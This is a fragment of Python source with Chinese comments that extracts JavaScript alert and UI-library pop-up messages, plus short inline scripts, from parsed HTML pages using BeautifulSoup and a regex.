            lines.append("\n[Body]: (empty)")

        return "\n".join(lines)
        
    def _extract_js_alerts_from_soup(self, soup) -> List[str]:
        """增强版 JS 弹窗提取，支持变量、流行 UI 库以及 body onload 等。"""
        import re
        js_alerts = []
        
        # 匹配原生 alert/confirm/prompt，以及流行 UI 库如 layer.msg, Swal.fire 等
        # (?:window\.)?(?:alert|confirm|prompt|layer\.msg|layer\.alert|layer\.confirm|Swal\.fire|toastr\.(?:error|warning|info|success)|\$\.messager\.alert)
        pattern = re.compile(r"(?:window\.)?(?:alert|confirm|prompt|layer\.msg|layer\.alert|layer\.confirm|Swal\.fire|toastr\.(?:error|warning|info|success)|\$\.messager\.alert)\s*\(\s*(.*?)\s*\)", re.IGNORECASE | re.DOTALL)
        
        # 1. 扫描所有 <script> 标签
        for script in soup.find_all("script"):
            # 使用 .text 而不是 .string，防止 HTML 注释导致 .string 为 None
            content = script.get_text()
            if content:
                matches = pattern.findall(content)
                for m in matches:
                    # 截断过长的匹配（比如 JSON 对象），并去除两端引号
                    val = m.strip('\'" \n\r')[:100]
                    if val:
                        js_alerts.append(val)
                        
        # 2. 扫描所有带有 onload / onerror 属性的标签 (如 <body onload="...">)
        for tag in soup.find_all(True):
            for attr in ["onload", "onerror"]:
                val = tag.get(attr)
                if val and isinstance(val, str):
                    matches = pattern.findall(val)
                    for m in matches:
                        clean_val = m.strip('\'" \n\r')[:100]
                        if clean_val:
                            js_alerts.append(clean_val)
                            
        # 去重并保持顺序
        return list(dict.fromkeys(js_alerts))

    def _extract_short_inline_scripts(self, soup) -> str:
        """提取页面中较短的内联脚本，作为终极兜底，防止遗漏任何自定义的弹窗函数 (如 parent.ShowError)。"""
        inline_scripts = []
        for script in soup.find_all("script"):
            # 只提取没有 src 属性的内联脚本
            if not script.get("src"):
                content = script.get_text(strip=True)
                if content and len(content) < 800:
                    inline_scripts.append(content)
        if inline_scripts:
            return "\n".join(inline_scripts)[:1500]
        return ""
